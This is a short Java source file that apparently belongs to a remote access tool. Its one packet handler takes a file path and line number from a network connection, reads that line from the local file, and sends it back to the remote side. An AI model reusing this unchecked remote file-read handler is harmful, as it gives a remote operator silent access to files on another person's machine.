package com.redpois0n.packets;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;


public class PacketRD extends Packet {

	@Override
	public void read(String line) throws Exception {
		String file = Connection.readLine();
		int l = Integer.parseInt(Connection.readLine());
		int readed = 0;
		BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
		while ((line = reader.readLine()) != null) {
			if (readed++ == l) {
				Connection.addToSendQueue(new PacketBuilder(Header.FILE_PREVIEW, new String[] { file, line }));
				break;
			}
		}
		reader.close();
	}

}
